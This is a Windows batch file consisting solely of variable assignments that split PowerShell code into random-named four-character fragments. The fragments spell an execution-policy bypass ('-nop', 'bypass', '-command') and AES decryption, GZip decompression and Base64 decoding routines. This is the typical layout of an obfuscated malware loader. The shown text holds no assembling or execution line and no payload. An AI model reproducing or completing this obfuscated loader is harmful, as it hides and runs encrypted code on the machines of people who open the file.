@echo off
set "OHwZDWRwLP=.IO."
set "srinrFfLcV=yste"
set "wOjymgSqkn=kcF."
set "BDIMRRPiIB=]::("
set "mwiOhCxdeK=rt]:"
set "UoArRHZLrq=urit"
set "vThmEiNOPO=ct S"
set "czEUyZtyrX=xTBR"
set "WUYjGbSTJi=);$w"
set "IEAxSLSziG=trea"
set "wsXHYuRxhz=UGTu"
set "YnpvTvUzsD=null"
set "ZUVoPGFUUv=pres"
set "QowBAGdQou=ANf "
set "gGWTXDDWKJ='')("
set "psRTSTkNTX=7;$z"
set "XCnSKVClbc=, $I"
set "FZAthGMZXm=Syst"
set "oTSVeJbmaP=BC;$"
set "deFXiqNOoq=y]::"
set "qJmJCJquWp=ddin"
set "rkqjruApoA=ecry"
set "PBqRwglmak=-Obj"
set "GgmlrXjYzu=lBlo"
set "yCwGoPFUVp=7Yiv"
set "cchgLrRMwU=yste"
set "UdBeXPHIug=6esa"
set "UfaBQnTWMB=aN);"
set "eCDaamnUmF=N, 0"
set "nSzQvoowWe=);$z"
set "FCEkumCtmI=ose("
set "JknKGQCcpY=$Yha"
set "FZLtgliYkh=ionM"
set "aZAwazvBJD=tem."
set "ShfkwnWjbU=yTo("
set "WPFgqNVxBw=1] -"
set "emgoMBTdEx=X.En"
set "rQGFFoyPtc=ypto"
set "uMZptJrfPW=ddin"
set "tdxnMtLkzI= New"
set "mwMyNbbCbx=.Key"
set "MZtKnEttGE=n ''"
set "CvpKTuARmX=PKCS"
set "PWwoUJGIWN=-joi"
set "EYAMJwLcUH=m.IO"
set "vnoVhqvnkh=t Sy"
set "AkPHoKWXTu=ring"
set "LOOpRCfbMB=in $"
set "CJxCUiFxGl=N = "
set "PJMWKPdFIm= = N"
set "vCovHewkmq=saBm"
set "ThDbTyGlgE=kGX "
set "YIJbnHNFzp=pDZz"
set "zVEDKgtTyd=gth)"
set "EUHhkhYPos=[-1."
set "nMcaLSFsfQ=em.C"
set "jSFiqEBTKu=stem"
set "MRhYBeXFtv=.GZi"
set "cAFUcpqxvt=('l0"
set "wrnURkyiKP=gMod"
set "jeXEKTsNvf=oint"
set "JGWMzzgJFb= = ["
set "dzexDDULCw=v4Ir"
set "QVbVgeAzTf=rofi"
set "crUfOzAKEs=WYGd"
set "DAEqNOhxSz=stem"
set "EPpWkFEsGp=k; }"
set "uYfBMqxXsl=.Com"
set "OyDIaWgPxB=)($I"
set "cxQvzxOawj=IeJa"
set "mNhgeRHagw=;$xs"
set "sWKOjJYlSz=.Dis"
set "OfFPakIfXj=ptog"
set "JlOMwvaaGv=.Cre"
set "yGrqoAOaTh=ne);"
set "KMATghGBkv=fore"
set "JRJDbKHulI=W = "
set "tSrRKYXTaA=.Cry"
set "MeIMlXrtwt=LOxk"
set "NDoneCZqJn=tion"
set "wGjENFfCQQ=  $y"
set "jOKFdzZKJU=ing("
set "eDKpDGmkqj=OyzA"
set "zwGFVNmNay=tsWi"
set "vHCrRqgbdY=se()"
set "uoByunFlyC=gnir"
set "mVvLQiuXum=Nf.T"
set "wdtEmzIcjJ=T) {"
set "bhVEWojIGk= [Sy"
set "eyjdmpOZCi=Bmor"
set "ZwrRzLmTne=();$"
set "DpslHkdDZA=oryS"
set "wTHLhZZZUj=Wqjt"
set "cGDhrlujpE=esaB"
set "hynHdsWTZu=-nop"
set "ZshOpXOjSm=.Len"
set "eoZhIyhEUD=();$"
set "jDJpIjhoXd=am;$"
set "jMIHJMhegQ=Q = "
set "ZQuhzJXiXw=join"
set "EAXjYzROAs=:: '"
set "svqMJFOcoL=tS46"
set "KuwJGsrohI=comm"
set "sHFBUkwfsL=3HWs"
set "cTUHfpCFha=[Sys"
set "cLiIBCSmaH=Obje"
set "EIOhDzrqzD=ion."
set "RkHhGFuzDN=ANf."
set "ZikUXvFjnI=);$z"
set "nyQHsYMJis=haBc"
set "HyUhnSLwtI=ode]"
set "KgOzBfZysQ=.Sec"
set "vFxHXWyzSH=.Mod"
set "mGddTuWunq=::('"
set "iWmzgUpHSG=xkF "
set "JwBgbwTDDs===')"
set "IHLjYmYRQL=IeJa"
set "CGGkScuZPr=Secu"
set "JPtapFVxfX= [Sy"
set "ohoUPxeIbV=; };"
set "kyILhCInPm=y.Pa"
set "taysqBbOae=d;$z"
set "DoYomoHijH=th('"
set "LSuxdqsfFL=[Sys"
set "PTwvZtrumT=-joi"
set "TfCDtZiVnZ='[-1"
set "fKZJucSpqA=Syst"
set "jJNlKoEOuE=oL'["
set "dbmVzoUCto=pose"
set "BPzvcASoGJ=Bc);"
set "rbkkVzYBPG=ptog"
set "TGOVazTtDK=orF'"
set "cCVsSzmNwm=Secu"
set "XpSHvbBDzw=)) {"
set "XOlEJRFmJT=$zWq"
set "PVjXAfwkeV=rity"
set "zPhBOHheAr=t.Pa"
set "aCEjNcljAT=$wHA"
set "daTlznLcgl=$WYG"
set "pHzgloMYwG=n ''"
set "qanClLIZkl=$Yha"
set "tmoOfFMSUY=Stre"
set "OKaIeYIacz=m.IO"
set "AKBMfdahxC=.Cop"
set "ctaSvkwhyx=GpiT"
set "YrcTFbmvyO=ZYYc"
set "yHspfyUXWZ=)($y"
set "sdpjlJpnPS=ateD"
set "wBOFecsuwt='txe"
set "aNqedTmTvO=] -j"
set "yevbRLTNRD=Comp"
set "sRhFkbeBIU=bypa"
set "uwRoPQQkbm=V = "
set "YvSmveDufS=O.Me"
set "tyOFSBUpcO=);$Y"
set "SWLvYavIYG=;$wU"
set "wVBpEMyuZb=ach "
set "zbOwnQDoSj=S46e"
set "rLAhJUVBkS=New-"
set "DjaUFEJvWg=Mode"
set "rCUTUEsRUH=ss -"
set "UjnkrTjIzx=y.Cr"
set "dTNmocdHlv=SjW."
set "cCTBkoolcs=-1.."
set "GQBYNspZKn=ewLi"
set "abChhHDYFY=, (,"
set "fLbwwxoxTE=Bc.T"
set "KfWanyVFuc=IeJa"
set "gtsODoToWk=Disp"
set "GrdIDDVZwx=rtS4"
set "RxnjZAXWPT=Conv"
set "IMaFNbsjZF=Obje"
set "TlqcHAPyBQ=lit("
set "TXgNGYOuLM=Comp"
set "IXVOXysbVG=comp"
set "SXCyUqxTHy=e]::"
